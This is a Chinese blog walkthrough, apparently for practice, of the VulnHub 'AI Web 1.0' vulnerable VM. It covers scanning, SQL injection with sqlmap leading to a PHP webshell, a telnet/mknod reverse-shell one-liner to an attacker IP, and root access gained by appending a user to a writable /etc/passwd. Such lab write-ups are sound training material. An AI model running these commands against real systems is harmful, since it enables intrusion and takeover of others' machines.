@@ -1,0 +1,265 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>AI Web 1.0 · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2024-07-30">2024年7月30日</time>
+        
+        
+          <span class="post__readtime">3 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/vulnhub%E9%9D%B6%E6%9C%BA/">#vulnhub靶机</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">AI Web 1.0</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <h1 id="一、靶机下载"><a href="#一、靶机下载" class="headerlink" title="一、靶机下载"></a>一、靶机下载</h1><p>靶机下载地址<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ai-web-1,353/">AI Web 1.0</a></p>
+<p>下载以后得到一个压缩文件</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221848652.png" alt="image-20240730173855427"></p>
+<p>解压之后，放到一个文件夹中。用VMware扫描虚拟机</p>
+<p><img src="/../../img/Typora/image-20240730174018313.png"></p>
+<p><img src="/../../img/Typora/image-20240730174050018.png"></p>
+<p><img src="/../../img/Typora/image-20240730174116466.png"></p>
+<h1 id="二、主机发现"><a href="#二、主机发现" class="headerlink" title="二、主机发现"></a>二、主机发现</h1><h2 id="1-使用arp-scan"><a href="#1-使用arp-scan" class="headerlink" title="1.使用arp-scan"></a>1.使用arp-scan</h2><p><img src="/../../img/Typora/image-20240730174422434.png" alt="image-20240730174422434"></p>
+<h2 id="2-使用msf"><a href="#2-使用msf" class="headerlink" title="2.使用msf"></a>2.使用msf</h2><p>使用msf的<code>auxiliary/scanner/discovery/arp_sweep</code>模块</p>
+<p><img src="/../../img/Typora/image-20240730174438480.png" alt="image-20240730174438480"></p>
+<h1 id="三、端口扫描"><a href="#三、端口扫描" class="headerlink" title="三、端口扫描"></a>三、端口扫描</h1><h2 id="1-使用nmap"><a href="#1-使用nmap" class="headerlink" title="1.使用nmap"></a>1.使用nmap</h2><p><img src="/../../img/Typora/image-20240730174916394.png" alt="image-20240730174916394"></p>
+<h2 id="2-使用msf-1"><a href="#2-使用msf-1" class="headerlink" title="2.使用msf"></a>2.使用msf</h2><p>使用msf的<code>auxiliary/scanner/portscan/tcp  </code>模块</p>
+<p><img src="/../../img/Typora/image-20240730175007024.png" alt="image-20240730175007024"></p>
+<p>在80端口开放了web服务</p>
+<h1 id="四、访问web页面"><a href="#四、访问web页面" class="headerlink" title="四、访问web页面"></a>四、访问web页面</h1><p><img src="/../../img/Typora/image-20240730175459892.png"></p>
+<p>先进行一个目录扫描</p>
+<p><img src="/../../img/Typora/image-20240730175741771.png" alt="image-20240730175741771"></p>
+<p><code>robots.txt</code>文件下暴露了两个路径</p>
+<p><img src="/../../img/Typora/image-20240730175825721.png"></p>
+<p>这两个路径都禁止访问</p>
+<p><img src="/../../img/Typora/image-20240730180022742.png"></p>
+<p><img src="/../../img/Typora/image-20240730180035103.png"></p>
+<p>对这两个路径进行更近一层的目录爆破</p>
+<p>在<code>m3diNf0</code>目录下发现info.php</p>
+<p><img src="/../../img/Typora/image-20240730181021422.png" alt="image-20240730181021422"></p>
+<p><img src="/../../img/Typora/image-20240730181054666.png" alt="image-20240730181054666"></p>
+<p>在<code>se3reTdir777/uploads/</code>目录下没有爆破到什么结果</p>
+<p><img src="/../../img/Typora/image-20240730181116862.png" alt="image-20240730181116862"></p>
+<p>在<code>se3reTdir777</code>目录下面有index.php文件，不知道我什么我没有扫出来(字典中有index.php)</p>
+<p><img src="/../../img/Typora/image-20240730191447993.png"></p>
+<p>输入<code>&#39;</code>‘存在数据库报错</p>
+<p><img src="/../../img/Typora/image-20240730191541534.png"></p>
+<p>bp抓包，暴库名</p>
+<p><img src="/../../img/Typora/image-20240730191608366.png" alt="image-20240730191608366"></p>
+<p>没有发现过滤，用sqlmap跑了</p>
+<p>用sqlmap跑post的方法</p>
+<p>先将数据包保存到一个txt文件中，在存在注入的参数后面加一个 <code>*</code></p>
+<p><img src="/../../img/Typora/image-20240730192340416.png"></p>
+<p>然后执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 你保存的文件名 --batch --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/Typora/image-20240730192526197.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行</span><br><span class="line">sqlmap -r 你保存的文件名 --batch --privileges</span><br><span class="line">发现有对文件的读写权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/Typora/image-20240731111237842.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行</span><br><span class="line">sqlmap -r 你保存的文件名 --os-shell</span><br><span class="line">这里吧--batch参数去掉</span><br></pre></td></tr></table></figure>
+
+<p>一句话木马选择php</p>
+<p><img src="/../../img/Typora/image-20240731111513233.png"></p>
+<p>这里写马路径选择2（我们自己输入）</p>
+<p><img src="/../../img/Typora/image-20240731111549191.png"></p>
+<p>在刚才的info.php中可以找到网站根目录</p>
+<p><img src="/../../img/Typora/image-20240731111800977.png"></p>
+<p>输入进去</p>
+<p><img src="/../../img/Typora/image-20240731111827834.png"></p>
+<p>网站根目录没有写的权限，这次写到upload目录下</p>
+<p><img src="/../../img/Typora/image-20240731112123493.png"></p>
+<p>写入两个文件一个是有文件上传功能的php文件，一个是webshell</p>
+<p><img src="/../../img/Typora/image-20240731112338923.png"></p>
+<p>上传一个木马，进行连接（上传后的文件上传到upload目录下面）</p>
+<p><img src="/../../img/Typora/image-20240731112621857.png"></p>
+<p>反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f x; mknod x p &amp;&amp; telnet 192.168.72.128 7777 0&lt;x | /bin/bash 1&gt;x </span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../../img/Typora/image-20240731160305496.png"></p>
+<h1 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h1><p><code>/etc/passwd</code>文件的所有者和所属组都是www-data</p>
+<p>可以通过手动添加管理用户来提权</p>
+<p>先用openssl来生成密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt Yliken 123456</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>openssl</strong>: 这是一个开源的加密工具包，支持各种密码学操作。</li>
+<li><strong>passwd</strong>: 这是 OpenSSL 工具中用来生成密码哈希的命令。</li>
+<li><strong>-1</strong>: 这个选项指定了使用的哈希算法类型，这里的 <code>-1</code> 表示使用 MD5 算法进行哈希。</li>
+<li><strong>-salt c1own</strong>: <code>-salt</code> 选项用来指定盐值，这里的盐是 <code>c1own</code>。</li>
+<li><strong>123456</strong>: 这是待哈希的原始密码</li>
+</ul>
+<p>然后写入到passwd中</p>
+<p><img src="/../../img/Typora/image-20240731160305496.png"></p>
+<p>然后su切换到新建的<code>Yliken</code>用户上这里在我的 终端工具 上面执行命令没有效果</p>
+<p>将shell反弹到我的Ubuntu主机上面进行接下来的操作</p>
+<p>用<code>python</code>生成一个交互式的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这个 Python 命令用于在一个终端中生成一个交互式的 Bash Shell。它利用了 Python 的 pty 模块来生成一个伪终端，然后在该伪终端上运行 &#x2F;bin&#x2F;bash ，从而创建一个交互式的 Bash Shell。</p>
+<p><img src="/../../img/Typora/image-20240731161809276.png"></p>
+<p>然后就提权成功了</p>
+<p><img src="/../../img/Typora/image-20240731161854198.png"></p>
+<p><img src="/../../img/Typora/image-20240731162101592.png"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-10-27">2024·10·27</time>
+          <a class="related__link" href="/2024/10/27/%E9%9D%B6%E6%9C%BA/hackmyvm/Hacker_Kid-v1.0.1/">Hacker_Kid-v1.0.1</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-10-10">2024·10·10</time>
+          <a class="related__link" href="/2024/10/10/%E9%9D%B6%E6%9C%BA/lazySysAdmin/">lazySysAdmin</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-09-27">2024·09·27</time>
+          <a class="related__link" href="/2024/09/27/%E9%9D%B6%E6%9C%BA/driftingblues2/">driftingblues2</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2024/07/31/%E9%9D%B6%E6%9C%BA/DC-1/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">DC-1</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2024/07/30/%E9%9D%B6%E6%9C%BA/zico2/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">zico2</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
